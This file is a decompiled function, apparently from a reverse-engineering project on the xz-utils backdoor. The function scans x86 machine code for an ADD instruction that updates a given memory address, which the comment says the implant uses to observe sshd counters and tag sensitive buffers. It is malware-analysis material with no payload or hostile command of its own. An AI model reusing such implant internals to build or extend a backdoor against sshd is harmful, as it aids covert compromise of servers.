// /home/kali/xzre-ghidra/xzregh/101170_find_add_instruction_with_mem_operand.c
// Function: find_add_instruction_with_mem_operand @ 0x101170
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_add_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)
/*
 * AutoDoc: Locates ADD instructions that update memory at a given address, capturing the scale of the increment. The scoring logic uses it to observe how sshd mutates counters so the implant can tag sensitive buffers.
 */

#include "xzre_types.h"


BOOL find_add_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  dasm_ctx_t local_80;
  
  pdVar4 = &local_80;
  for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined4 *)&pdVar4->instruction = 0;
    pdVar4 = (dasm_ctx_t *)((long)&pdVar4->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &local_80;
  }
  while( true ) {
    if (code_end <= code_start) {
      return 0;
    }
    BVar2 = x86_dasm(dctx,code_start,code_end);
    if ((((BVar2 != 0) &&
         (iVar1._0_1_ = dctx->_unknown810[0], iVar1._1_1_ = dctx->_unknown810[1],
         iVar1._2_1_ = dctx->_unknown810[2], iVar1._3_1_ = dctx->field_0x2b, iVar1 == 0x103)) &&
        (((dctx->field2_0x10).field0.field11_0xc.modrm_word & 0xff00ff00) == 0x5000000)) &&
       ((mem_address == (void *)0x0 ||
        ((((dctx->field2_0x10).field0.flags2 & 1) != 0 &&
         ((u8 *)mem_address ==
          dctx->instruction + dctx->instruction_size + *(long *)dctx->_unknown812)))))) break;
    code_start = code_start + 1;
  }
  return 1;
}

